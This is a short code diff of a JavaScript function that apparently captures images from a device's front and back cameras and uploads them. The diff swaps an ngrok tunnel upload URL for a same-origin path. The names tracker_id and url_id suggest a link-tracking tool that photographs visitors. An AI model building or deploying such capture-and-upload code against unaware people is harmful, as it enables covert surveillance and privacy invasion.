@@ -1,6 +1,6 @@
 async function sendCameraCaptures(url_id, tracker_id) {
 
-    const UPLOAD_URL = "https://4a23-2a01-36d-2000-480e-a8c6-1606-f3d3-9cb2.ngrok-free.app/save_captured_image/";
+    //const UPLOAD_URL = window.location.origin + "/save_captured_image/";
 
     async function captureAndSend(facingMode, filename) {
 
@@ -63,7 +63,7 @@ async function sendCameraCaptures(url_id, tracker_id) {
         );
 
 
-        await fetch(UPLOAD_URL, {
+        await fetch("/save_captured_image/", {
             method: "POST",
             body: formData
         });
